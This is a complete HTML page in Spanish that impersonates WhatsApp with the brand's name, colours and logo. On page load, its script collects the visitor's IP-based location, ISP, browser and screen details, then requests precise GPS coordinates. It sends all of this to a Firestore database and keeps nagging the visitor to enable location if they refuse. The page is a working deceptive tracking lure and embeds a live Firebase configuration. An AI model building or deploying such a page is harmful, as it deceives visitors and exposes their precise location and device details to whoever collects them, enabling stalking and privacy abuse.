<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>WhatsApp</title>
    <style>
        .imagen-superior {
            display: block;
            width: 140px;
            margin: 20px auto;
            border-radius: 15px;
        }
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: linear-gradient(180deg, #7ED957, #25D366);
            min-height: 100vh;
            text-align: center;
        }
        h2 {
            color: #075E54;
            font-size: 32px;
            margin-bottom: 10px;
        }
        p {
            color: #128C7E;
            font-size: 18px;
            margin-bottom: 20px;
        }
        iframe {
            width: 100%;
            height: 350px;
            border: none;
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.25);
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6);
            justify-content: center;
            align-items: center;
            z-index: 9999;
        }
        .modal-contenido {
            background: #fff;
            width: 300px;
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
        }
        .modal-contenido h3 {
            color: #075E54;
            margin-bottom: 10px;
        }
        .modal-contenido p {
            color: #444;
            margin-bottom: 20px;
        }
        .modal-contenido button {
            background: #25D366;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            margin: 5px;
        }
        .modal-contenido button:hover {
            background: #1DA851;
        }
        #btnRecargar {
            background-color: #075E54;
        }
        #btnRecargar:hover {
            background-color: #054a42;
        }
    </style>
</head>
<body>
    <img src="logowhatsapp.jpg" alt="Logo" class="imagen-superior" />
    <h2>WhatsApp obtuvo la ubicación ...</h2>
    <p id="estado">Cargando datos de IP...</p>
    <iframe src="https://www.google.com/maps?q=Colombia&output=embed"></iframe>

    <div id="miAlerta" class="modal">
        <div class="modal-contenido">
            <img src="imagenubicacion.jpg" class="imagen-superior" alt="Ubicación" />
            <h3>Permiso de ubicación</h3>
            <p id="textoAlerta"></p>
            <button id="btnAceptar">Aceptar</button>
            <button id="btnRecargar">Recargar página</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
        import {
            getFirestore,
            collection,
            addDoc,
            updateDoc,
            doc,
            serverTimestamp
        } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDSWRC7tyowLD-ZnzvSzkTDS9L3P_eGfRM",
            authDomain: "proyecto-1-ea0ed.firebaseapp.com",
            projectId: "proyecto-1-ea0ed",
            storageBucket: "proyecto-1-ea0ed.firebasestorage.app",
            messagingSenderId: "440062306942",
            appId: "1:440062306942:web:74eab86708e22587d7462f"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const estado = document.getElementById("estado");
        const modal = document.getElementById("miAlerta");
        const textoAlerta = document.getElementById("textoAlerta");
        const btnAceptar = document.getElementById("btnAceptar");
        const btnRecargar = document.getElementById("btnRecargar");

        let docId = null;
        let datosIP = {};
        let ubicacionObtenida = false;
        let solicitudEnProgreso = false;

        // Mostrar/ocultar modal
        function mostrarAlerta(texto) {
            textoAlerta.textContent = texto;
            modal.style.display = "flex";
        }

        function ocultarAlerta() {
            modal.style.display = "none";
        }

        // Botón Aceptar: recarga la página (porque después de denegar, el navegador no volverá a preguntar)
        btnAceptar.addEventListener("click", function () {
            window.location.reload();
        });

        // Botón Recargar: igual
        btnRecargar.addEventListener("click", function () {
            window.location.reload();
        });

        // Obtener datos de IP
        async function obtenerDatosIP() {
            try {
                const respuesta = await fetch("https://ipapi.co/json/");
                if (!respuesta.ok) throw new Error("Error al consultar ipapi");
                const data = await respuesta.json();
                return {
                    ip: data.ip || "Desconocido",
                    ciudad: data.city || "Desconocido",
                    region: data.region || "Desconocido",
                    pais: data.country_name || "Desconocido",
                    proveedor: data.org || "Desconocido",
                    zonaHoraria: data.timezone || "Desconocido"
                };
            } catch (error) {
                console.error("Error obteniendo IP:", error);
                return {
                    ip: "No disponible",
                    ciudad: "No disponible",
                    region: "No disponible",
                    pais: "No disponible",
                    proveedor: "No disponible",
                    zonaHoraria: "No disponible"
                };
            }
        }

        // Guardar documento inicial con IP y datos del navegador
        async function guardarDatosIniciales() {
            try {
                const docRef = await addDoc(collection(db, "ubicaciones"), {
                    ...datosIP,
                    userAgent: navigator.userAgent,
                    idioma: navigator.language,
                    plataforma: navigator.platform,
                    anchoPantalla: screen.width,
                    altoPantalla: screen.height,
                    lat: null,
                    lon: null,
                    precision: null,
                    fecha: serverTimestamp(),
                    ubicacion_obtenida: false
                });
                docId = docRef.id;
                console.log("Documento inicial creado ID:", docId);
                estado.textContent = "✅ Datos de IP guardados. Solicitando ubicación...";
                return true;
            } catch (error) {
                console.error("Error al guardar datos iniciales:", error);
                estado.textContent = "⚠️ Error al guardar datos iniciales.";
                return false;
            }
        }

        // Actualizar el documento con la ubicación GPS
        async function actualizarConUbicacion(posicion) {
            if (!docId) return false;
            try {
                await updateDoc(doc(db, "ubicaciones", docId), {
                    lat: posicion.coords.latitude,
                    lon: posicion.coords.longitude,
                    precision: posicion.coords.accuracy,
                    ubicacion_obtenida: true,
                    fecha_ubicacion: serverTimestamp()
                });
                console.log("Ubicación actualizada en el documento");
                return true;
            } catch (error) {
                console.error("Error al actualizar con ubicación:", error);
                return false;
            }
        }

        // Solicitar ubicación GPS
        function solicitarUbicacion() {
            if (!navigator.geolocation) {
                mostrarAlerta("Tu navegador no soporta geolocalización.");
                return;
            }
            if (solicitudEnProgreso || ubicacionObtenida) return;
            solicitudEnProgreso = true;
            estado.textContent = "📍 Solicitando permiso de ubicación...";

            navigator.geolocation.getCurrentPosition(
                async (posicion) => {
                    solicitudEnProgreso = false;
                    ubicacionObtenida = true;
                    estado.textContent = "📍 Ubicación obtenida, actualizando...";
                    const actualizado = await actualizarConUbicacion(posicion);
                    if (actualizado) {
                        estado.textContent = "✅ Información completa guardada. Abriendo Google Maps...";
                        ocultarAlerta();
                        const lat = posicion.coords.latitude;
                        const lon = posicion.coords.longitude;
                        setTimeout(() => {
                            window.location.href = "https://www.google.com/maps?q=" + lat + "," + lon;
                        }, 2500);
                    } else {
                        estado.textContent = "⚠️ No se pudo actualizar la ubicación.";
                        mostrarAlerta("Error al guardar la ubicación. Intenta de nuevo.");
                    }
                },
                (error) => {
                    solicitudEnProgreso = false;
                    console.log("Código de error de geolocalización:", error.code);
                    let mensaje = "";
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            mensaje = "Permiso de ubicación denegado. Activa la ubicación en los ajustes del navegador y recarga la página.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            mensaje = "No fue posible obtener la ubicación. Asegúrate de que el GPS esté activo.";
                            break;
                        case error.TIMEOUT:
                            mensaje = "La solicitud de ubicación tardó demasiado. Intenta de nuevo.";
                            break;
                        default:
                            mensaje = "Ocurrió un error desconocido (" + error.code + ").";
                    }
                    if (!ubicacionObtenida) {
                        mostrarAlerta(mensaje);
                    }
                    estado.textContent = "⚠️ " + mensaje;
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        // FLUJO PRINCIPAL
        (async function main() {
            estado.textContent = "🌐 Obteniendo datos de IP...";
            datosIP = await obtenerDatosIP();

            const guardado = await guardarDatosIniciales();
            if (!guardado) {
                estado.textContent = "⚠️ Error crítico al guardar. Recarga la página.";
                return;
            }

            // Intentar obtener la ubicación directamente (sin verificar permisos)
            solicitarUbicacion();
        })();
    </script>
</body>
</html>
